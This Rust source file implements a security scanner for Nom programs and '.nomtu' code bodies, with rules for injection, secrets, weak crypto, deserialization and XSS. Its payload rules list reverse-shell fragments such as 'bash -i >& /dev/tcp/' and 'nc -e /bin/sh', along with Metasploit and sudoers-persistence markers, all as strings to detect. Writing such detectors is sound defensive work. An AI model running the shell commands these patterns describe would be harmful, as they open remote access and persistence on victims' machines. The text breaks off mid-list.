//! nom-security: Deep security analysis for Nom compositions and .nomtu bodies.
//!
//! Two layers of security checking:
//!
//! **Layer 1 — .nom program security (compile-time):**
//!   - Minimum security/reliability scores for resolved words
//!   - License compatibility and supply-chain provenance
//!   - CVE flags, untrusted sources
//!   - Effect escalation detection
//!
//! **Layer 2 — .nomtu body security (dictionary-time):**
//!   - OWASP Top 10 pattern detection (injection, XSS, XXE, etc.)
//!   - Attack payload signatures (reverse shells, msfvenom, backdoors)
//!   - Secrets and credential detection (API keys, tokens, private keys)
//!   - Weak cryptography detection (MD5, SHA1, DES, ECB, insecure RNG)
//!   - Insecure deserialization, path traversal, hardcoded config
//!
//! Produces a [`SecurityReport`] for program-level checks and
//! `Vec<SecurityFinding>` for body-level scans.

use nom_ast::{Declaration, NomRef, SourceFile, Statement};
use nom_resolver::{Resolver, ResolverError};
use serde::{Deserialize, Serialize};
use thiserror::Error;

// ── Errors ───────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum SecurityError {
    #[error("resolver error: {0}")]
    Resolver(#[from] ResolverError),
    #[error("serialization error: {0}")]
    Json(#[from] serde_json::Error),
}

// ── Severity ─────────────────────────────────────────────────────────────────

/// Security finding severity levels.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    /// Parse from a string (case-insensitive). Returns `None` for unknown.
    pub fn from_str_loose(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "info" => Some(Self::Info),
            "low" => Some(Self::Low),
            "medium" | "med" => Some(Self::Medium),
            "high" => Some(Self::High),
            "critical" | "crit" => Some(Self::Critical),
            _ => None,
        }
    }
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Info => write!(f, "INFO"),
            Severity::Low => write!(f, "LOW"),
            Severity::Medium => write!(f, "MEDIUM"),
            Severity::High => write!(f, "HIGH"),
            Severity::Critical => write!(f, "CRITICAL"),
        }
    }
}

// ── SecurityFinding ──────────────────────────────────────────────────────────

/// A single security finding from scanning a .nomtu body or .nom program.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityFinding {
    pub severity: Severity,
    /// Category: "injection", "secrets", "crypto", "payload", "xss", "deserialization",
    /// "path_traversal", "config", "score", "supply_chain", "cve", "effect_escalation".
    pub category: String,
    /// Rule identifier, e.g. "SEC-001".
    pub rule_id: String,
    pub message: String,
    /// The matching line or pattern, if available.
    pub evidence: Option<String>,
    /// 1-based line number within the body, if available.
    pub line: Option<usize>,
    /// Suggested fix.
    pub remediation: Option<String>,
    // Keep backward-compat fields for program-level findings.
    /// Word name (populated for program-level findings).
    pub word: Option<String>,
    /// Variant name (populated for program-level findings).
    pub variant: Option<String>,
}

// ── SecurityReport (program-level) ──────────────────────────────────────────

/// Summary security report for a .nom source file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityReport {
    pub findings: Vec<SecurityFinding>,
    pub passed: bool,
    pub max_severity: Option<Severity>,
}

impl SecurityReport {
    pub fn new() -> Self {
        Self {
            findings: Vec::new(),
            passed: true,
            max_severity: None,
        }
    }

    pub fn push(&mut self, finding: SecurityFinding) {
        if finding.severity >= Severity::High {
            self.passed = false;
        }
        let sev = finding.severity;
        self.findings.push(finding);
        self.max_severity = Some(match self.max_severity {
            Some(current) => current.max(sev),
            None => sev,
        });
    }

    pub fn critical_count(&self) -> usize {
        self.findings.iter().filter(|f| f.severity == Severity::Critical).count()
    }

    pub fn high_count(&self) -> usize {
        self.findings.iter().filter(|f| f.severity == Severity::High).count()
    }

    /// Serialize the report to JSON.
    pub fn to_json(&self) -> Result<String, SecurityError> {
        Ok(serde_json::to_string_pretty(self)?)
    }
}

impl Default for SecurityReport {
    fn default() -> Self {
        Self::new()
    }
}

// ── SecurityConfig ───────────────────────────────────────────────────────────

/// Security checker configuration.
#[derive(Debug, Clone)]
pub struct SecurityConfig {
    /// Minimum acceptable security score. Words below this threshold are flagged.
    pub min_security_score: f64,
    /// Minimum acceptable reliability score.
    pub min_reliability_score: f64,
    /// If true, flag words from non-registry sources.
    pub require_registry_source: bool,
    /// Allowed license identifiers (SPDX). Empty = allow all.
    pub allowed_licenses: Vec<String>,
}

impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            min_security_score: 0.7,
            min_reliability_score: 0.5,
            require_registry_source: false,
            allowed_licenses: Vec::new(),
        }
    }
}

// ── SecurityChecker (Layer 1 — program-level) ───────────────────────────────

/// Runs security checks on a .nom source file against the dictionary.
pub struct SecurityChecker<'r> {
    resolver: &'r Resolver,
    config: SecurityConfig,
}

impl<'r> SecurityChecker<'r> {
    pub fn new(resolver: &'r Resolver, config: SecurityConfig) -> Self {
        Self { resolver, config }
    }

    pub fn with_defaults(resolver: &'r Resolver) -> Self {
        Self::new(resolver, SecurityConfig::default())
    }

    /// Run all security checks and return a report.
    pub fn check(&self, source: &SourceFile) -> Result<SecurityReport, SecurityError> {
        let mut report = SecurityReport::new();
        for decl in &source.declarations {
            self.check_declaration(decl, &mut report)?;
        }
        Ok(report)
    }

    fn check_declaration(
        &self,
        decl: &Declaration,
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        for stmt in &decl.statements {
            match stmt {
                Statement::Need(need) => {
                    self.check_nom_ref(&need.reference, report)?;
                }
                Statement::Flow(flow) => {
                    self.check_flow_steps(&flow.chain.steps, report)?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn check_flow_steps(
        &self,
        steps: &[nom_ast::FlowStep],
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        for step in steps {
            match step {
                nom_ast::FlowStep::Ref(nom_ref) => {
                    self.check_nom_ref(nom_ref, report)?;
                }
                nom_ast::FlowStep::Branch(block) => {
                    for arm in &block.arms {
                        self.check_flow_steps(&arm.chain.steps, report)?;
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn check_nom_ref(
        &self,
        nom_ref: &NomRef,
        report: &mut SecurityReport,
    ) -> Result<(), SecurityError> {
        let entry = match self.resolver.resolve(nom_ref) {
            Ok(e) => e,
            Err(ResolverError::NotFound { .. }) => return Ok(()),
            Err(e) => return Err(SecurityError::Resolver(e)),
        };

        let label = format!(
            "{}{}",
            entry.word,
            entry.variant.as_deref().map(|v| format!("::{v}")).unwrap_or_default()
        );

        // Check minimum security score
        if entry.security < self.config.min_security_score {
            report.push(SecurityFinding {
                severity: if entry.security < 0.3 { Severity::Critical } else { Severity::High },
                category: "score".to_owned(),
                rule_id: "SEC-P01".to_owned(),
                message: format!(
                    "{label} has security score {:.2} below minimum {:.2}",
                    entry.security, self.config.min_security_score
                ),
                evidence: None,
                line: None,
                remediation: Some("Choose a word with higher security score or audit this word's body".to_owned()),
                word: Some(entry.word.clone()),
                variant: entry.variant.clone(),
            });
        }

        // Check minimum reliability score
        if entry.reliability < self.config.min_reliability_score {
            report.push(SecurityFinding {
                severity: Severity::Medium,
                category: "score".to_owned(),
                rule_id: "SEC-P02".to_owned(),
                message: format!(
                    "{label} has reliability score {:.2} below minimum {:.2}",
                    entry.reliability, self.config.min_reliability_score
                ),
                evidence: None,
                line: None,
                remediation: Some("Choose a more reliable variant or add tests".to_owned()),
                word: Some(entry.word.clone()),
                variant: entry.variant.clone(),
            });
        }

        // Check for untrusted source
        if self.config.require_registry_source {
            if let Some(source) = &entry.source {
                if !source.starts_with("https://registry.nom-lang.org") {
                    report.push(SecurityFinding {
                        severity: Severity::Low,
                        category: "supply_chain".to_owned(),
                        rule_id: "SEC-P03".to_owned(),
                        message: format!("{label} comes from untrusted source: {source}"),
                        evidence: Some(source.clone()),
                        line: None,
                        remediation: Some("Use words from the official registry".to_owned()),
                        word: Some(entry.word.clone()),
                        variant: entry.variant.clone(),
                    });
                }
            } else {
                report.push(SecurityFinding {
                    severity: Severity::Low,
                    category: "supply_chain".to_owned(),
                    rule_id: "SEC-P04".to_owned(),
                    message: format!("{label} has no source URL (local or unverified)"),
                    evidence: None,
                    line: None,
                    remediation: Some("Register the word with a verified source".to_owned()),
                    word: Some(entry.word.clone()),
                    variant: entry.variant.clone(),
                });
            }
        }

        // Check for CVE flags
        if let Some(hash) = &entry.hash {
            if hash.starts_with("CVE-") {
                report.push(SecurityFinding {
                    severity: Severity::Critical,
                    category: "cve".to_owned(),
                    rule_id: "SEC-P05".to_owned(),
                    message: format!("{label} is flagged with known vulnerability: {hash}"),
                    evidence: Some(hash.clone()),
                    line: None,
                    remediation: Some("Remove or replace this word with a patched version".to_owned()),
                    word: Some(entry.word.clone()),
                    variant: entry.variant.clone(),
                });
            }
        }

        // Effect escalation: if entry has dangerous effects, warn
        for effect in &entry.effects {
            match effect.as_str() {
                "network" | "filesystem" | "process" | "system" => {
                    report.push(SecurityFinding {
                        severity: Severity::Info,
                        category: "effect_escalation".to_owned(),
                        rule_id: "SEC-P06".to_owned(),
                        message: format!("{label} declares effect '{effect}' — verify this is expected"),
                        evidence: Some(effect.clone()),
                        line: None,
                        remediation: None,
                        word: Some(entry.word.clone()),
                        variant: entry.variant.clone(),
                    });
                }
                _ => {}
            }
        }

        Ok(())
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Layer 2 — .nomtu body scanning
// ══════════════════════════════════════════════════════════════════════════════

/// Scan a .nomtu body for security issues. Returns findings sorted by severity (highest first).
pub fn scan_body(body: &str, language: &str) -> Vec<SecurityFinding> {
    let mut findings = Vec::new();
    scan_injection(body, language, &mut findings);
    scan_secrets(body, &mut findings);
    scan_crypto(body, &mut findings);
    scan_payloads(body, &mut findings);
    scan_deserialization(body, language, &mut findings);
    scan_xss(body, language, &mut findings);
    scan_path_traversal(body, &mut findings);
    scan_hardcoded_config(body, &mut findings);
    findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    findings
}

/// Compute a security score from findings. 1.0 = clean, 0.0 = critical issues present.
pub fn security_score(findings: &[SecurityFinding]) -> f64 {
    if findings.is_empty() {
        return 1.0;
    }
    let mut penalty = 0.0_f64;
    for f in findings {
        penalty += match f.severity {
            Severity::Critical => 0.40,
            Severity::High => 0.20,
            Severity::Medium => 0.10,
            Severity::Low => 0.03,
            Severity::Info => 0.0,
        };
    }
    (1.0 - penalty).max(0.0)
}

// ── Injection scanner ────────────────────────────────────────────────────────

/// Detect SQL injection, command injection, and eval patterns.
fn scan_injection(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    // SQL injection: string concatenation in queries
    static SQL_CONCAT_PATTERNS: &[&str] = &[
        "\"SELECT ",
        "\"INSERT ",
        "\"UPDATE ",
        "\"DELETE ",
        "'SELECT ",
        "'INSERT ",
        "'UPDATE ",
        "'DELETE ",
        "\"DROP ",
        "'DROP ",
    ];
    static SQL_INTERP_MARKERS: &[&str] = &[
        "\" +",
        "\" .",
        "' +",
        "' .",
        "${",
        "f\"",
        "f'",
        ".format(",
        "% ",
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // SQL string concatenation
        for pattern in SQL_CONCAT_PATTERNS {
            if trimmed.contains(pattern) {
                for marker in SQL_INTERP_MARKERS {
                    if trimmed.contains(marker) {
                        out.push(SecurityFinding {
                            severity: Severity::Critical,
                            category: "injection".to_owned(),
                            rule_id: "SEC-B01".to_owned(),
                            message: "SQL query with string concatenation/interpolation — use parameterized queries".to_owned(),
                            evidence: Some(trimmed.to_owned()),
                            line: Some(i + 1),
                            remediation: Some("Use parameterized queries (?, $1) instead of string concatenation".to_owned()),
                            word: None,
                            variant: None,
                        });
                        break;
                    }
                }
            }
        }

        // Command injection: shell exec with variables
        let cmd_injection_patterns: &[(&str, &str)] = &[
            ("os.system(", "os.system() with user input"),
            ("subprocess.call(", "subprocess.call() — use subprocess.run with shell=False"),
            ("subprocess.Popen(", "subprocess.Popen() — verify shell=False"),
            ("Runtime.getRuntime().exec(", "Java Runtime.exec() with concatenation"),
            ("eval(", "eval() — dynamic code execution"),
            ("system(", "system() call — use safer alternatives"),
            ("popen(", "popen() — command execution"),
            ("Process.Start(", "Process.Start() — verify input sanitization"),
        ];
        for (pat, msg) in cmd_injection_patterns {
            if trimmed.contains(pat) {
                // Skip if it's a comment
                if is_comment(trimmed, language) {
                    continue;
                }
                let severity = if *pat == "eval(" {
                    Severity::High
                } else {
                    Severity::Medium
                };
                out.push(SecurityFinding {
                    severity,
                    category: "injection".to_owned(),
                    rule_id: "SEC-B02".to_owned(),
                    message: msg.to_string(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Avoid dynamic execution; use safe APIs with validated inputs".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Secrets scanner ──────────────────────────────────────────────────────────

/// Detect hardcoded secrets, API keys, tokens, and private keys.
fn scan_secrets(body: &str, out: &mut Vec<SecurityFinding>) {
    // API key prefixes (high-confidence patterns)
    static API_KEY_PREFIXES: &[(&str, &str)] = &[
        ("AKIA", "AWS Access Key ID"),
        ("sk_live_", "Stripe live secret key"),
        ("sk_test_", "Stripe test secret key"),
        ("ghp_", "GitHub personal access token"),
        ("gho_", "GitHub OAuth token"),
        ("ghu_", "GitHub user-to-server token"),
        ("ghs_", "GitHub server-to-server token"),
        ("glpat-", "GitLab personal access token"),
        ("xoxb-", "Slack bot token"),
        ("xoxp-", "Slack user token"),
        ("xoxa-", "Slack app token"),
        ("SG.", "SendGrid API key"),
    ];

    // Private key markers
    static PRIVATE_KEY_MARKERS: &[&str] = &[
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN DSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
    ];

    // Generic secret assignment patterns (case-insensitive matching)
    static SECRET_ASSIGN_PATTERNS: &[&str] = &[
        "password =",
        "password=",
        "passwd =",
        "passwd=",
        "secret =",
        "secret=",
        "api_key =",
        "api_key=",
        "apikey =",
        "apikey=",
        "token =",
        "token=",
        "aws_secret_access_key",
        "aws_access_key_id",
        "aws_session_token",
        "database_url",
        "db_password",
        "private_key =",
        "private_key=",
        "client_secret",
        "auth_token",
        "bearer ",
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // API key prefixes
        for (prefix, desc) in API_KEY_PREFIXES {
            if trimmed.contains(prefix) {
                // Only flag if it looks like a value assignment, not a variable name check
                if trimmed.contains('=') || trimmed.contains('"') || trimmed.contains('\'') {
                    out.push(SecurityFinding {
                        severity: Severity::Critical,
                        category: "secrets".to_owned(),
                        rule_id: "SEC-B03".to_owned(),
                        message: format!("Possible hardcoded {desc}"),
                        evidence: Some(redact_secret(trimmed)),
                        line: Some(i + 1),
                        remediation: Some("Use environment variables or a secrets manager".to_owned()),
                        word: None,
                        variant: None,
                    });
                }
            }
        }

        // Private keys
        for marker in PRIVATE_KEY_MARKERS {
            if trimmed.contains(marker) {
                out.push(SecurityFinding {
                    severity: Severity::Critical,
                    category: "secrets".to_owned(),
                    rule_id: "SEC-B04".to_owned(),
                    message: "Embedded private key".to_owned(),
                    evidence: Some(marker.to_string()),
                    line: Some(i + 1),
                    remediation: Some("Store private keys in a secure vault, not in source code".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }

        // Generic secret assignments — only flag when there's a string literal value
        let lower = trimmed.to_ascii_lowercase();
        for pat in SECRET_ASSIGN_PATTERNS {
            if lower.contains(pat) {
                // Must have a string literal after the assignment (not empty or placeholder)
                if has_string_literal_value(trimmed) {
                    out.push(SecurityFinding {
                        severity: Severity::High,
                        category: "secrets".to_owned(),
                        rule_id: "SEC-B05".to_owned(),
                        message: format!("Possible hardcoded secret ({pat})"),
                        evidence: Some(redact_secret(trimmed)),
                        line: Some(i + 1),
                        remediation: Some("Use environment variables or a secrets manager".to_owned()),
                        word: None,
                        variant: None,
                    });
                    break; // one finding per line
                }
            }
        }
    }
}

// ── Crypto weakness scanner ──────────────────────────────────────────────────

/// Detect weak cryptographic algorithms and insecure random number generation.
fn scan_crypto(body: &str, out: &mut Vec<SecurityFinding>) {
    struct CryptoPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[CryptoPattern] = &[
        // Weak hash functions used for security
        CryptoPattern {
            pattern: "md5(",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "MD5 hash function — cryptographically broken",
            remediation: "Use SHA-256, SHA-3, or Argon2 for password hashing",
        },
        CryptoPattern {
            pattern: "hashlib.md5",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "Python MD5 — cryptographically broken",
            remediation: "Use hashlib.sha256 or argon2",
        },
        CryptoPattern {
            pattern: "MD5.Create",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: ".NET MD5 — cryptographically broken",
            remediation: "Use SHA256.Create() or Argon2",
        },
        CryptoPattern {
            pattern: "MessageDigest.getInstance(\"MD5\"",
            severity: Severity::High,
            rule_id: "SEC-B06",
            message: "Java MD5 — cryptographically broken",
            remediation: "Use MessageDigest.getInstance(\"SHA-256\")",
        },
        CryptoPattern {
            pattern: "sha1(",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: "SHA-1 hash — broken for collision resistance",
            remediation: "Use SHA-256 or SHA-3",
        },
        CryptoPattern {
            pattern: "hashlib.sha1",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: "Python SHA-1 — broken for collision resistance",
            remediation: "Use hashlib.sha256 or hashlib.sha3_256",
        },
        CryptoPattern {
            pattern: "SHA1.Create",
            severity: Severity::High,
            rule_id: "SEC-B07",
            message: ".NET SHA-1 — broken for collision resistance",
            remediation: "Use SHA256.Create()",
        },
        // Obsolete ciphers
        CryptoPattern {
            pattern: "3DES",
            severity: Severity::Medium,
            rule_id: "SEC-B08",
            message: "3DES is deprecated",
            remediation: "Use AES-256-GCM",
        },
        CryptoPattern {
            pattern: "TripleDES",
            severity: Severity::Medium,
            rule_id: "SEC-B08",
            message: "Triple DES is deprecated",
            remediation: "Use AES-256-GCM",
        },
        CryptoPattern {
            pattern: "RC4",
            severity: Severity::High,
            rule_id: "SEC-B09",
            message: "RC4 is broken — known biases in keystream",
            remediation: "Use AES-256-GCM or ChaCha20-Poly1305",
        },
        CryptoPattern {
            pattern: "Blowfish",
            severity: Severity::Medium,
            rule_id: "SEC-B10",
            message: "Blowfish has a 64-bit block size — vulnerable to birthday attacks",
            remediation: "Use AES-256-GCM",
        },
        // ECB mode
        CryptoPattern {
            pattern: "MODE_ECB",
            severity: Severity::High,
            rule_id: "SEC-B11",
            message: "ECB mode encryption — insecure, leaks patterns",
            remediation: "Use MODE_GCM or MODE_CTR",
        },
        CryptoPattern {
            pattern: "\"ECB\"",
            severity: Severity::High,
            rule_id: "SEC-B11",
            message: "ECB mode — identical plaintext blocks produce identical ciphertext",
            remediation: "Use GCM, CTR, or CBC with HMAC",
        },
        // Insecure random
        CryptoPattern {
            pattern: "math.random",
            severity: Severity::High,
            rule_id: "SEC-B12",
            message: "math.random() is not cryptographically secure",
            remediation: "Use crypto.getRandomValues() or a CSPRNG",
        },
        CryptoPattern {
            pattern: "Math.random",
            severity: Severity::High,
            rule_id: "SEC-B12",
            message: "Math.random() is not cryptographically secure",
            remediation: "Use crypto.getRandomValues() or window.crypto",
        },
        CryptoPattern {
            pattern: "rand()",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "rand() may not be cryptographically secure",
            remediation: "Use a CSPRNG (e.g. getrandom, OsRng in Rust)",
        },
        CryptoPattern {
            pattern: "srand(",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "srand() seeds a non-cryptographic PRNG",
            remediation: "Use a CSPRNG for security-sensitive random numbers",
        },
        CryptoPattern {
            pattern: "random.random",
            severity: Severity::Medium,
            rule_id: "SEC-B12",
            message: "Python random module is not cryptographically secure",
            remediation: "Use secrets module or os.urandom()",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                if is_comment(trimmed, "") {
                    continue;
                }
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "crypto".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
                break; // one crypto finding per line
            }
        }
    }
}

// ── Payload scanner ──────────────────────────────────────────────────────────

/// Detect reverse shell patterns, msfvenom payloads, and backdoor indicators.
fn scan_payloads(body: &str, out: &mut Vec<SecurityFinding>) {
    struct PayloadPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
    }

    static REVERSE_SHELLS: &[PayloadPattern] = &[
        // Bash reverse shells
        PayloadPattern {
            pattern: "bash -i >& /dev/tcp/",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Bash reverse shell pattern",
        },
        PayloadPattern {
            pattern: "bash -i >&/dev/tcp/",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Bash reverse shell pattern",
        },
        // Netcat reverse shells
        PayloadPattern {
            pattern: "nc -e /bin/sh",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Netcat reverse shell",
        },
        PayloadPattern {
            pattern: "nc -e /bin/bash",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Netcat reverse shell",
        },
        PayloadPattern {
            pattern: "ncat -e /bin",
            severity: Severity::Critical,
            rule_id: "SEC-B13",
            message: "Ncat reverse shell",
        },
        // Python reverse shell
        PayloadPattern {
            pattern: "import socket",
            severity: Severity::Low, // common legitimate use; only flagged at low
            rule_id: "SEC-B14",
            message: "Socket import — verify no reverse shell pattern",
        },
        PayloadPattern {
            pattern: "socket.socket(",
            severity: Severity::Low,
            rule_id: "SEC-B14",
            message: "Raw socket creation — verify legitimate use",
        },
        // Perl/Ruby reverse shells
        PayloadPattern {
            pattern: "IO.popen(",
            severity: Severity::Medium,
            rule_id: "SEC-B15",
            message: "IO.popen — potential command execution",
        },
    ];

    static EXPLOIT_TOOLS: &[PayloadPattern] = &[
        PayloadPattern {
            pattern: "msfvenom",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit payload generator reference",
        },
        PayloadPattern {
            pattern: "meterpreter",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Meterpreter payload reference",
        },
        PayloadPattern {
            pattern: "reverse_tcp",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit reverse TCP payload pattern",
        },
        PayloadPattern {
            pattern: "reverse_http",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit reverse HTTP payload pattern",
        },
        PayloadPattern {
            pattern: "bind_tcp",
            severity: Severity::Critical,
            rule_id: "SEC-B16",
            message: "Metasploit bind TCP payload pattern",
        },
        PayloadPattern {
            pattern: "shellcode",
            severity: Severity::High,
            rule_id: "SEC-B17",
            message: "Shellcode reference — verify context",
        },
    ];

    static BACKDOOR_INDICATORS: &[PayloadPattern] = &[
        PayloadPattern {
            pattern: "chmod 777",
            severity: Severity::High,
            rule_id: "SEC-B18",
            message: "chmod 777 — world-writable permissions",
        },
        PayloadPattern {
            pattern: "chmod 4",
            severity: Severity::High,
            rule_id: "SEC-B18",
            message: "setuid bit — potential privilege escalation",
        },
        PayloadPattern {
            pattern: "setuid",
            severity: Severity::Medium,
            rule_id: "SEC-B19",
            message: "setuid reference — verify no privilege escalation",
        },
        PayloadPattern {
            pattern: "setgid",
            severity: Severity::Medium,
            rule_id: "SEC-B19",
            message: "setgid reference — verify no privilege escalation",
        },
        PayloadPattern {
            pattern: "crontab",
            severity: Severity::Medium,
            rule_id: "SEC-B20",
            message: "Crontab modification — potential persistence mechanism",
        },
        PayloadPattern {
            pattern: "/etc/cron",
            severity: Severity::Medium,
            rule_id: "SEC-B20",
            message: "Cron directory access — potential persistence mechanism",
        },
        PayloadPattern {
            pattern: "visudo",
            severity: Severity::High,
            rule_id: "SEC-B21",
            message: "sudoers modification — privilege escalation",
        },
        PayloadPattern {
            pattern: "NOPASSWD",
            severity: Severity::High,
            rule_id: "SEC-B21",
            message: "NOPASSWD in sudoers — passwordless sudo",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        for group in [
            &REVERSE_SHELLS[..],
            &EXPLOIT_TOOLS[..],
            &BACKDOOR_INDICATORS[..],
        ] {
            for p in group {
                if trimmed.contains(p.pattern) {
                    out.push(SecurityFinding {
                        severity: p.severity,
                        category: "payload".to_owned(),
                        rule_id: p.rule_id.to_owned(),
                        message: p.message.to_owned(),
                        evidence: Some(trimmed.to_owned()),
                        line: Some(i + 1),
                        remediation: Some("Remove or justify this pattern".to_owned()),
                        word: None,
                        variant: None,
                    });
                }
            }
        }
    }
}

// ── Deserialization scanner ──────────────────────────────────────────────────

/// Detect insecure deserialization patterns.
fn scan_deserialization(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    struct DeserPattern {
        pattern: &'static str,
        languages: &'static [&'static str], // empty = all languages
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[DeserPattern] = &[
        DeserPattern {
            pattern: "pickle.loads",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "pickle.loads() — arbitrary code execution on untrusted data",
            remediation: "Use json.loads() or a safe serialization format",
        },
        DeserPattern {
            pattern: "pickle.load(",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "pickle.load() — arbitrary code execution on untrusted data",
            remediation: "Use json.load() or a safe serialization format",
        },
        DeserPattern {
            pattern: "cPickle.loads",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B22",
            message: "cPickle.loads() — arbitrary code execution on untrusted data",
            remediation: "Use json.loads() or a safe serialization format",
        },
        DeserPattern {
            pattern: "yaml.load(",
            languages: &["python", "py"],
            severity: Severity::High,
            rule_id: "SEC-B23",
            message: "yaml.load() without SafeLoader — arbitrary code execution",
            remediation: "Use yaml.safe_load() or yaml.load(data, Loader=SafeLoader)",
        },
        DeserPattern {
            pattern: "yaml.unsafe_load",
            languages: &["python", "py"],
            severity: Severity::Critical,
            rule_id: "SEC-B23",
            message: "yaml.unsafe_load() — arbitrary code execution",
            remediation: "Use yaml.safe_load()",
        },
        DeserPattern {
            pattern: "Marshal.load",
            languages: &["ruby", "rb"],
            severity: Severity::High,
            rule_id: "SEC-B24",
            message: "Marshal.load — arbitrary code execution on untrusted data",
            remediation: "Use JSON.parse() for untrusted data",
        },
        DeserPattern {
            pattern: "ObjectInputStream",
            languages: &["java"],
            severity: Severity::High,
            rule_id: "SEC-B25",
            message: "Java ObjectInputStream — insecure deserialization",
            remediation: "Use a safe serialization format or add deserialization filters",
        },
        DeserPattern {
            pattern: "readObject(",
            languages: &["java"],
            severity: Severity::Medium,
            rule_id: "SEC-B25",
            message: "readObject() — verify deserialization safety",
            remediation: "Add ObjectInputFilter or use JSON/protobuf",
        },
        DeserPattern {
            pattern: "unserialize(",
            languages: &["php"],
            severity: Severity::Critical,
            rule_id: "SEC-B26",
            message: "PHP unserialize() — object injection vulnerability",
            remediation: "Use json_decode() for untrusted data",
        },
    ];

    let lang_lower = language.to_ascii_lowercase();
    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        for p in PATTERNS {
            if !p.languages.is_empty() && !p.languages.contains(&lang_lower.as_str()) {
                continue;
            }
            if trimmed.contains(p.pattern) {
                // For yaml.load, check if SafeLoader is on the same line
                if p.pattern == "yaml.load(" && trimmed.contains("SafeLoader") {
                    continue;
                }
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "deserialization".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── XSS scanner ──────────────────────────────────────────────────────────────

/// Detect cross-site scripting patterns.
fn scan_xss(body: &str, language: &str, out: &mut Vec<SecurityFinding>) {
    let lang = language.to_ascii_lowercase();
    let is_web = matches!(lang.as_str(), "javascript" | "js" | "typescript" | "ts" | "html" | "jsx" | "tsx" | "php");

    if !is_web {
        // Still check for innerHTML in any language (could be embedded HTML)
        for (i, line) in body.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.contains("innerHTML") && !is_comment(trimmed, language) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "xss".to_owned(),
                    rule_id: "SEC-B28".to_owned(),
                    message: "innerHTML assignment — potential XSS".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Use textContent or a sanitization library".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
        return;
    }

    struct XssPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[XssPattern] = &[
        XssPattern {
            pattern: "innerHTML",
            severity: Severity::High,
            rule_id: "SEC-B28",
            message: "innerHTML assignment — potential XSS",
            remediation: "Use textContent or a sanitization library (DOMPurify)",
        },
        XssPattern {
            pattern: "outerHTML",
            severity: Severity::High,
            rule_id: "SEC-B28",
            message: "outerHTML assignment — potential XSS",
            remediation: "Use safe DOM methods",
        },
        XssPattern {
